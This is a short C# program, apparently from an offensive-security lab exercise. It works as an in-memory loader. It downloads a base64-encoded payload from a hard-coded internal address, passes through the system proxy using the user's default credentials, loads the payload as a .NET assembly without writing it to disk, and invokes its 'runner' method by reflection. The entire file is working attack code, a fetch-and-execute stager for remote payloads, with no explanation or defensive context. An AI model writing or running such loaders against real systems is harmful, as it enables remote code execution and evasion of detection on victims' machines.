using System;
using System.Net;
using System.Reflection;
using System.Text;

namespace test
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] dll = GetShellcode("http://192.168.49.83/main");

            Assembly SampleAssembly = Assembly.Load(dll);
            
            Type t = SampleAssembly.GetType("ManagedClass.Class1");

            var staticMethod = t.GetMethod("runner");

            staticMethod.Invoke(null, null);
        }
        public static byte[] GetShellcode(string url)
        {
            WebClient client = new WebClient();
            // what be the user agent? 
            // Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");
            client.Proxy = WebRequest.GetSystemWebProxy();
            client.Proxy.Credentials = CredentialCache.DefaultCredentials;
            string compressedEncodedShellcode = client.DownloadString(url);
            return Convert.FromBase64String(compressedEncodedShellcode);
        }
    }
}
